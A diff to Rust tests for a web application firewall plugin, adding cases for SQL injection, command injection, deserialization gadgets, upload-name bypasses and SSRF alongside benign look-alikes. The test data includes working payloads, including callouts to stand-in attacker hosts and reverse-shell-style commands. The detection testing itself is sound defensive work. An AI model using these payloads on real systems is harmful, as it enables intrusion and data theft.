@@ -14,6 +14,7 @@
 
 use ferrum_edge::plugins::waf::Waf;
 use ferrum_edge::plugins::{Plugin, PluginResult, RequestContext};
+use ferrum_edge::policy_path::canonicalize_policy_path;
 use serde_json::json;
 
 fn ctx(method: &str, path: &str) -> RequestContext {
@@ -148,29 +149,60 @@ async fn blind_time_delay_sqli_is_detected_in_query_and_body() {
     ] {
         assert_detected(&plugin, "FE-SQLI-006", Surface::Query(query)).await;
     }
+    assert_clean(&plugin, "FE-SQLI-006", Surface::Query("q=sleep%20tips")).await;
+
+    // Level-1 body coverage requires SQL context around the delay call.
+    for body in [
+        br#"{"id":"1 AND SLEEP(5)"}"#.as_slice(),
+        br#"{"id":"1' AND (SELECT(SLEEP(5)))-- "}"#,
+        br#"{"id":"1 AND IF(1=1,SLEEP(5),0)"}"#,
+        br#"{"id":"x'+sleep(5)+'"}"#,
+        br#"{"id":"1 ORDER BY SLEEP(5)"}"#,
+        br#"{"q":"x'||pg_sleep(5)||'"}"#,
+        br#"{"id":"1) OR BENCHMARK(5000000,MD5(1))#"}"#,
+        br#"{"id":"1';WAITFOR DELAY '0:0:5'--"}"#,
+    ] {
+        assert_detected(&plugin, "FE-SQLI-010-B", Surface::Body(JSON, body)).await;
+    }
     assert_detected(
         &plugin,
-        "FE-SQLI-006-B",
-        Surface::Body(JSON, br#"{"id":"1 AND SLEEP(5)"}"#),
-    )
-    .await;
-    assert_detected(
-        &plugin,
-        "FE-SQLI-006-B",
+        "FE-SQLI-010-B",
         Surface::Body(FORM, b"id=1+AND+SLEEP%285%29"),
     )
     .await;
 
-    // Application code calls `sleep` as a method or after `await`; neither is
-    // SQL-shaped context.
-    for body in [
+    // Application code calls `sleep` as a method, after `await`, after a
+    // statement separator, in an assignment, or in parentheses; `benchmark`
+    // is an ordinary function name. None of these is SQL context.
+    let code_bodies = [
         br#"{"code":"import time\ntime.sleep(1)"}"#.as_slice(),
         br#"{"code":"await sleep(100)"}"#,
         br#"{"note":"I need sleep; benchmark results are in"}"#,
-    ] {
+        br#"{"code":"foo();\n  sleep(1);"}"#,
+        br#"{"code":"x = sleep(5)"}"#,
+        br#"{"code":"if ready: (sleep(1))"}"#,
+        br#"{"code":"benchmark(1000, fn)"}"#,
+    ];
+    for body in code_bodies {
+        assert_clean(&plugin, "FE-SQLI-010-B", Surface::Body(JSON, body)).await;
         assert_clean(&plugin, "FE-SQLI-006-B", Surface::Body(JSON, body)).await;
     }
-    assert_clean(&plugin, "FE-SQLI-006", Surface::Query("q=sleep%20tips")).await;
+    assert_clean(
+        &plugin,
+        "FE-SQLI-010-B",
+        Surface::Body(TEXT, b"void run() {\n  foo();\n  sleep(1);\n}\n"),
+    )
+    .await;
+
+    // The exact query-pattern body mirror is level 2, where code shapes are an
+    // accepted cost.
+    let level_two = monitor_waf(2);
+    for body in [
+        br#"{"id":"1;sleep(5)"}"#.as_slice(),
+        br#"{"code":"x = sleep(5)"}"#,
+    ] {
+        assert_detected(&level_two, "FE-SQLI-006-B", Surface::Body(JSON, body)).await;
+    }
 }
 
 #[tokio::test]
@@ -210,18 +242,27 @@ async fn catalog_enumeration_and_error_based_sqli_are_detected() {
     ] {
         assert_detected(&plugin, "FE-SQLI-008", Surface::Query(query)).await;
     }
-    assert_detected(
-        &plugin,
-        "FE-SQLI-008-B",
-        Surface::Body(TEXT, b"x' AND utl_http.request('http://attacker/')='1"),
-    )
-    .await;
+    for body in [
+        b"x' AND utl_http.request('http://attacker/')='1".as_slice(),
+        b"1 union select load_file(0x2f6574632f706173737764)",
+        b"1 union select load_file(concat('\\\\',version(),'.attacker.example\\a'))",
+    ] {
+        assert_detected(&plugin, "FE-SQLI-008-B", Surface::Body(TEXT, body)).await;
+    }
     assert_clean(
         &plugin,
         "FE-SQLI-008",
         Surface::Query("q=update%20xml%20outfile%20docs"),
     )
     .await;
+    // `load_file` as an ordinary function or method name.
+    for body in [
+        b"def load_file(path):\n    return open(path).read()\n".as_slice(),
+        b"data = load_file(filename)",
+        b"cfg = loader.load_file('/etc/app.conf')",
+    ] {
+        assert_clean(&plugin, "FE-SQLI-008-B", Surface::Body(TEXT, body)).await;
+    }
 }
 
 #[tokio::test]
@@ -284,6 +325,12 @@ async fn cookie_values_are_an_injection_surface() {
         Surface::Cookie("lang=../../../../etc/passwd"),
     )
     .await;
+
+    // `FE-SQLI-003-C` has no detection case here: the Cookie header is split
+    // on `;` before matching, so the stacked-statement `;` can only reach it
+    // percent-encoded (`id=1%3BDROP%20TABLE%20users`) once cookie values are
+    // also scanned decoded. That detection case belongs with the change that
+    // adds decoded cookie views.
 
     // Real-world cookie jars: analytics ids, JWT sessions, locale.
     for rule in [
@@ -372,13 +419,19 @@ async fn command_execution_without_a_classic_chain_is_detected() {
         "host=x$(cat%20/etc/passwd)",
         "host=127.0.0.1%0Awhoami",
         "host=127.0.0.1%0D%0Aid",
+        "host=127.0.0.1%0Acat%20/etc/passwd",
+        "host=127.0.0.1%0Abash%20-i",
+        "host=127.0.0.1%0AIPCONFIG",
         "host=a|uname%20-a",
         "host=a%26%26ifconfig",
+        "host=a%26%26uname",
+        "host=a;powershell%20-nop",
+        "host=a|busybox%20%3E/tmp/x",
         "file=cat${IFS}/etc/passwd",
     ] {
         assert_detected(&plugin, "FE-CMD-004", Surface::Query(query)).await;
     }
-    // Delimited lists and ordinary words stay clean.
+    // Delimited lists, multi-line prose, and ordinary words stay clean.
     for query in [
         "tags=linux;bash;php",
         "q=dogs|cat",
@@ -386,6 +439,15 @@ async fn command_execution_without_a_classic_chain_is_detected() {
         "company=R%26D",
         "price=$(USD)",
         "q=whoami",
+        "tags=windows;powershell",
+        "tags=windows;powershell;linux",
+        "skills=bash|pwsh",
+        "tags=linux;busybox",
+        "fields=id|uname",
+        "note=Order%0AID:%2012345",
+        "note=Pets%0ACat%20food",
+        "note=first%0Acat%20food%0Asecond",
+        "note=intro%0APython%20is%20fun",
     ] {
         assert_clean(&plugin, "FE-CMD-004", Surface::Query(query)).await;
     }
@@ -447,6 +509,11 @@ async fn shellshock_is_detected_in_headers_and_the_cgi_query_string() {
         Surface::Header("x-snippet", "function() { return 1; }"),
     )
     .await;
+    // Query keys and values that contain `() {` later, or `()` with no body.
+    let benign_query = "()=1&cb=function()%20%7B%20return%201;%20%7D&sig=f()";
+    for rule in ["FE-SHELLSHOCK-001-Q", "FE-SHELLSHOCK-001-QV"] {
+        assert_clean(&plugin, rule, Surface::Query(benign_query)).await;
+    }
 }
 
 #[tokio::test]
@@ -483,6 +550,23 @@ async fn ognl_injection_is_detected_including_the_content_type_vector() {
         Surface::Query("email=dev@java.lang.example.org&t=%25%7Bname%7D"),
     )
     .await;
+    // A real multipart `Content-Type`, and a body with a CSS id selector, a
+    // `%{name}` format placeholder, and a `java.lang` email address.
+    assert_clean(
+        &plugin,
+        "FE-OGNL-001-H",
+        Surface::Header("content-type", "multipart/form-data; boundary=----x1"),
+    )
+    .await;
+    assert_clean(
+        &plugin,
+        "FE-OGNL-001-B",
+        Surface::Body(
+            JSON,
+            br##"{"selector":"#context-menu","template":"%{name}","email":"dev@java.lang.example.org"}"##,
+        ),
+    )
+    .await;
 }
 
 #[tokio::test]
@@ -517,12 +601,6 @@ async fn php_and_node_code_injection_are_detected() {
     ] {
         assert_detected(&level_one, "FE-PHP-002-Q", Surface::Query(query)).await;
     }
-    assert_detected(
-        &level_one,
-        "FE-PHP-002",
-        Surface::Body(JSON, br#"{"template":"phar://uploads/x.jpg/y"}"#),
-    )
-    .await;
     assert_clean(&level_one, "FE-PHP-002-Q", Surface::Query("zip=90210")).await;
 
     for query in [
@@ -540,9 +618,15 @@ async fn php_and_node_code_injection_are_detected() {
     .await;
 
     // Code-hosting and notebook APIs carry source, so body mirrors are L2.
+    // PHP reads its own request body through `php://input`.
     let php_source: &[u8] = br#"{"source":"<?php echo 'hi'; ?>"}"#;
     let node_source: &[u8] = br#"{"source":"const cp = require('child_process');"}"#;
+    let php_wrapper_source: &[u8] = br#"{"source":"$raw = file_get_contents('php://input'); $t = fopen('php://temp', 'r+');"}"#;
+    let phar_value: &[u8] = br#"{"template":"phar://uploads/x.jpg/y"}"#;
     assert_clean(&level_one, "FE-PHP-001-B", Surface::Body(JSON, php_source)).await;
+    for body in [php_wrapper_source, phar_value] {
+        assert_clean(&level_one, "FE-PHP-002-B", Surface::Body(JSON, body)).await;
+    }
     assert_clean(
         &level_one,
         "FE-NODE-001-B",
@@ -551,6 +635,9 @@ async fn php_and_node_code_injection_are_detected() {
     .await;
     let level_two = monitor_waf(2);
     assert_detected(&level_two, "FE-PHP-001-B", Surface::Body(JSON, php_source)).await;
+    for body in [php_wrapper_source, phar_value] {
+        assert_detected(&level_two, "FE-PHP-002-B", Surface::Body(JSON, body)).await;
+    }
     assert_detected(
         &level_two,
         "FE-NODE-001-B",
@@ -593,6 +680,8 @@ async fn restricted_file_probes_are_detected_on_the_canonical_path() {
         "/.npmrc",
         "/web.config",
         "/wp-config.php.bak",
+        "/wp-config.php~",
+        "/.wp-config.php.swp",
         "/.DS_Store",
         "/.svn/entries",
     ] {
@@ -605,9 +694,18 @@ async fn restricted_file_probes_are_detected_on_the_canonical_path() {
         "/api/env",
         "/docs/git/config",
         "/.envelope",
+        "/wp-config-sample.php",
     ] {
         assert_clean(&plugin, "FE-RESTRICTED-001", Surface::Path(path)).await;
     }
+
+    // The WAF reads the canonical policy path, which has already decoded an
+    // encoded `.`; the literal `/.git/config` spelling is not required.
+    let encoded = canonicalize_policy_path("/%2egit/config").unwrap();
+    assert_eq!(encoded, "/.git/config");
+    assert_detected(&plugin, "FE-RESTRICTED-001", Surface::Path(&encoded)).await;
+    let benign = canonicalize_policy_path("/docs/%2egithub/README").unwrap();
+    assert_clean(&plugin, "FE-RESTRICTED-001", Surface::Path(&benign)).await;
 
     // Backup/dump artifacts are legitimate downloads on some sites: L2.
     assert_clean(
@@ -653,6 +751,13 @@ async fn executable_upload_filename_requires_multipart_inspection() {
         "filename=shell.jsp",
         "filename*=UTF-8''shell.aspx",
         "filename=\".htaccess\"",
+        // Windows/IIS strip trailing dots and spaces and read `::$DATA` as the
+        // default stream; a NUL truncates the name in C-backed handlers.
+        "filename=\"shell.php.\"",
+        "filename=\"shell.php \"",
+        "filename=\"shell.php::$DATA\"",
+        "filename=\"shell.php%00.jpg\"",
+        "filename=\"shell.php\0.jpg\"",
     ] {
         let part = format!(
             "--b\r\nContent-Disposition: form-data; name=\"f\"; {filename}\r\n\r\nx\r\n--b--\r\n"
@@ -679,6 +784,24 @@ async fn executable_upload_filename_requires_multipart_inspection() {
         )
         .await;
     }
+
+    // A form or JSON field that names a script is not an upload: only a
+    // multipart `Content-Disposition` parameter is.
+    assert_clean(
+        &inspecting,
+        "FE-UPLOAD-001",
+        Surface::Body(FORM, b"title=home&filename=index.php"),
+    )
+    .await;
+    assert_clean(
+        &inspecting,
+        "FE-UPLOAD-001",
+        Surface::Body(
+            JSON,
+            br#"{"filename":"index.php","path":"/var/www/shell.php"}"#,
+        ),
+    )
+    .await;
 }
 
 #[tokio::test]
@@ -690,6 +813,13 @@ async fn deserialization_gadgets_are_detected_without_flagging_json_ld() {
         Surface::Body(TEXT, b"payload=aced0005737200116a617661"),
     )
     .await;
+    // Hex ids that merely contain the magic, or carry no stream after it.
+    for body in [
+        br#"{"commit":"9aced0005c0ffee12"}"#.as_slice(),
+        br#"{"color":"aced0005"}"#,
+    ] {
+        assert_clean(&plugin, "FE-DESER-001", Surface::Body(JSON, body)).await;
+    }
     for body in [
         b"!!python/object/apply:os.system ['id']".as_slice(),
         b"x: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[]]]",
@@ -701,6 +831,12 @@ async fn deserialization_gadgets_are_detected_without_flagging_json_ld() {
         br#"{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x/a","autoCommit":true}"#.as_slice(),
         br#"{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}"#,
         br#"{"@class":"org.springframework.context.support.FileSystemXmlApplicationContext"}"#,
+        // Fastjson autoType bypasses: JVM descriptor and array spellings.
+        br#"{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://x/a"}"#,
+        br#"{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://x/a"}"#,
+        br#"{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://x/a"}]}"#,
+        // Jackson `WRAPPER_ARRAY` default typing carries no discriminator key.
+        br#"["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://x/a"}]"#,
     ] {
         assert_detected(&plugin, "FE-DESER-005", Surface::Body(JSON, body)).await;
     }
@@ -708,6 +844,9 @@ async fn deserialization_gadgets_are_detected_without_flagging_json_ld() {
         br#"{"@context":"https://schema.org","@type":"Product","name":"Widget"}"#.as_slice(),
         br#"{"$type":"MyApp.Models.Order, MyApp"}"#,
         br#"{"@class":"com.example.Invoice"}"#,
+        br#"{"@type":"Lunch"}"#,
+        br#"["com.example.Order",{"id":1}]"#,
+        br#"{"deps":[["org.apache.commons:commons-lang3",{"scope":"test"}]]}"#,
     ] {
         assert_clean(&plugin, "FE-DESER-005", Surface::Body(JSON, body)).await;
     }
@@ -742,6 +881,9 @@ async fn ssrf_covers_additional_metadata_endpoints_and_alternate_loopback_forms(
         "u=http://%5B::1%5D/",
         "u=http://%5B::ffff:127.0.0.1%5D/",
         "u=gopher://localhost:6379/_INFO",
+        "u=http://127.1/",
+        "u=http://127.0.1:8080/",
+        "u=http://localhost./admin",
     ];
     for query in loopback_forms {
         assert_clean(&level_one, "FE-SSRF-003-Q", Surface::Query(query)).await;
@@ -755,6 +897,7 @@ async fn ssrf_covers_additional_metadata_endpoints_and_alternate_loopback_forms(
         "u=https://example.com/",
         "u=http://123.45.67.89/",
         "u=http://0day.example/",
+        "u=http://127.1.example.com/",
     ] {
         assert_clean(&level_two, "FE-SSRF-003-Q", Surface::Query(query)).await;
     }
@@ -808,6 +951,11 @@ async fn recommended_posture_enforces_new_level_one_signatures() {
         Surface::Body(
             JSON,
             br#"{"@context":"https://schema.org","@type":"Product","code":"time.sleep(1)","html":"<svg></svg>"}"#,
+        ),
+        // Code-carrying bodies (LLM prompts, gists, CI APIs) at level 1.
+        Surface::Body(
+            JSON,
+            br#"{"src":"def load_file(path):\n    raw = file_get_contents('php://input')\n    x = sleep(5)\n    benchmark(1000, fn)\n    foo();\n    sleep(1);"}"#,
         ),
     ] {
         let (result, request) = scan(&plugin, &surface).await;
